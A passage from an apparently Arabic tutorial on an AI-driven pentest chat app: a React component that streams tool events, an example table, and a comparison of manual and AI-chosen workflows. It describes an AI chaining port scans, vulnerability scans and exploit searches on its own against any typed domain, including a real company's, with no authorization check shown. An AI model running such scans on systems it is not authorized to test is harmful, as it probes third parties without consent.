  dns_recon:      'استطلاع DNS',
  generate_report:'توليد التقرير',
};

interface ToolEvent {
  tool: string;
  status: 'running' | 'done' | 'error';
  input?: Record<string, unknown>;
  result?: unknown;
}

interface Message {
  role: 'user' | 'assistant';
  content: string;
  toolEvents?: ToolEvent[];
}

export function ChatWithToolUse() {
  const [messages, setMessages] = useState<Message[]>([]);
  const [input, setInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [activeTools, setActiveTools] = useState<ToolEvent[]>([]);
  const historyRef = useRef<Array<{ role: 'user' | 'assistant'; content: string }>>([]);

  const sendMessage = async () => {
    if (!input.trim() || isLoading) return;

    const userMessage = input.trim();
    setInput('');
    setIsLoading(true);
    setActiveTools([]);

    setMessages(prev => [...prev, { role: 'user', content: userMessage }]);

    // رد الذكاء الاصطناعي يُبنى تدريجياً
    let assistantText = '';
    const toolEvents: ToolEvent[] = [];

    setMessages(prev => [...prev, {
      role: 'assistant',
      content: '',
      toolEvents: [],
    }]);

    try {
      const response = await fetch('/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: userMessage,
          history: historyRef.current,
        }),
      });

      if (!response.body) throw new Error('No stream');

      const reader = response.body.getReader();
      const decoder = new TextDecoder();
      let buffer = '';

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;

        buffer += decoder.decode(value, { stream: true });
        const lines = buffer.split('\n');
        buffer = lines.pop() ?? '';

        for (const line of lines) {
          if (!line.startsWith('data: ')) continue;
          const data = JSON.parse(line.slice(6));

          // أحداث SSE المختلفة من الـ API
          if (line.startsWith('event: text')) {
            assistantText += data.content;
          } else if (line.startsWith('event: tool_start')) {
            const event: ToolEvent = {
              tool: data.tool,
              status: 'running',
              input: data.input,
            };
            toolEvents.push(event);
            setActiveTools([...toolEvents]);
          } else if (line.startsWith('event: tool_result')) {
            const idx = toolEvents.findLastIndex(e => e.tool === data.tool);
            if (idx !== -1) {
              toolEvents[idx] = { ...toolEvents[idx], status: 'done', result: data.result };
              setActiveTools([...toolEvents]);
            }
          } else if (line.startsWith('event: done')) {
            break;
          }

          // تحديث الرسالة الجارية في الوقت الفعلي
          setMessages(prev => {
            const updated = [...prev];
            updated[updated.length - 1] = {
              role: 'assistant',
              content: assistantText,
              toolEvents: [...toolEvents],
            };
            return updated;
          });
        }
      }

      // تحديث سجل المحادثة للرسالة التالية
      historyRef.current.push(
        { role: 'user', content: userMessage },
        { role: 'assistant', content: assistantText }
      );
    } catch (err) {
      console.error('Tool use error:', err);
    } finally {
      setIsLoading(false);
      setActiveTools([]);
    }
  };

  return (
    <div className="flex flex-col h-full bg-black text-white">
      {/* منطقة الرسائل */}
      <div className="flex-1 overflow-y-auto p-4 space-y-4">
        {messages.map((msg, i) => (
          <div key={i} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
            <div className={`max-w-3xl rounded-lg p-4 ${
              msg.role === 'user'
                ? 'bg-red-900/40 border border-red-700/30'
                : 'bg-zinc-900 border border-zinc-700/30'
            }`}>
              {/* عرض الأدوات التي استخدمها الذكاء الاصطناعي */}
              {msg.toolEvents && msg.toolEvents.length > 0 && (
                <div className="mb-3 space-y-2">
                  {msg.toolEvents.map((event, j) => (
                    <div key={j} className="flex items-center gap-2 text-xs px-3 py-1.5 rounded
                      bg-zinc-800 border border-zinc-600/40">
                      <span className={event.status === 'running' ? 'text-yellow-400 animate-pulse' : 'text-green-400'}>
                        {TOOL_ICONS[event.tool]}
                      </span>
                      <span className="text-zinc-300">{TOOL_LABELS[event.tool] ?? event.tool}</span>
                      {event.status === 'running' && (
                        <span className="text-yellow-500 text-xs">جارٍ التنفيذ...</span>
                      )}
                      {event.status === 'done' && (
                        <span className="text-green-500 text-xs">✓ اكتمل</span>
                      )}
                    </div>
                  ))}
                </div>
              )}

              {/* نص الرد */}
              <p className="text-sm leading-relaxed whitespace-pre-wrap">
                {msg.content}
                {isLoading && i === messages.length - 1 && (
                  <span className="inline-block w-1 h-4 bg-red-400 animate-pulse ml-1" />
                )}
              </p>
            </div>
          </div>
        ))}
      </div>

      {/* مؤشر الأدوات الجارية */}
      {activeTools.some(t => t.status === 'running') && (
        <div className="px-4 py-2 border-t border-zinc-800">
          <div className="flex items-center gap-2 text-xs text-yellow-400">
            <span className="animate-spin">⟳</span>
            <span>الذكاء الاصطناعي يعمل على: {
              activeTools
                .filter(t => t.status === 'running')
                .map(t => TOOL_LABELS[t.tool] ?? t.tool)
                .join('، ')
            }</span>
          </div>
        </div>
      )}

      {/* صندوق الإدخال */}
      <div className="p-4 border-t border-zinc-800">
        <div className="flex gap-3">
          <input
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && !e.shiftKey && sendMessage()}
            placeholder='اكتب طلبك بلغة طبيعية... مثلاً: "افحص example.com وابحث عن ثغرات"'
            disabled={isLoading}
            className="flex-1 bg-zinc-900 border border-zinc-700 rounded-lg px-4 py-3
              text-sm text-white placeholder-zinc-500 focus:outline-none
              focus:border-red-600 disabled:opacity-50"
          />
          <button
            onClick={sendMessage}
            disabled={isLoading || !input.trim()}
            className="px-6 py-3 bg-red-700 hover:bg-red-600 disabled:bg-zinc-700
              text-white rounded-lg text-sm font-medium transition-colors"
          >
            {isLoading ? '...' : 'إرسال'}
          </button>
        </div>
        <p className="mt-2 text-xs text-zinc-600 text-center">
          الذكاء الاصطناعي يختار الأدوات تلقائياً — لا حاجة لضغط أي زر
        </p>
      </div>
    </div>
  );
}
```

---

## 6. أمثلة على قرارات الذكاء الاصطناعي التلقائية

| ما يكتبه المستخدم | الأدوات التي يقررها الذكاء الاصطناعي تلقائياً |
|---|---|
| "افحص example.com" | `port_scan` → `vuln_scan` |
| "ابحث عن معلومات عن tesla.com" | `osint_gather` + `dns_recon` (متوازيان) |
| "هل يوجد exploit لـ CVE-2021-44228؟" | `exploit_search` |
| "قيّم أمان هذا الموقع كاملاً" | `osint_gather` → `port_scan` → `vuln_scan` → `web_scan` → `generate_report` |
| "ولد تقرير بكل ما وجدناه" | `generate_report` |
| "ابحث عن النطاقات الفرعية لـ target.com" | `dns_recon` + `osint_gather` |

---

## 7. الفرق الجوهري بين النظامين

```
النظام القديم (أزرار يدوية):
المستخدم → يرى أزراراً → يضغط "فحص المنافذ" → ينتظر → يضغط "OSINT" → ينتظر
الذكاء الاصطناعي: مجرد عارض للنتائج، لا يقرر شيئاً.

النظام الجديد (Function Calling):
المستخدم → "افحص example.com بالكامل وأعطني تقريراً"
الذكاء الاصطناعي → يفهم القصد → يقرر: port_scan أولاً
                  → يرى النتائج → يقرر: vuln_scan على الخدمات المكتشفة
                  → يرى الثغرات → يقرر: exploit_search لأخطر CVE
                  → يجمع كل شيء → يقرر: generate_report
                  → يقدم تحليلاً متكاملاً
لا زر واحد ضُغط.
```

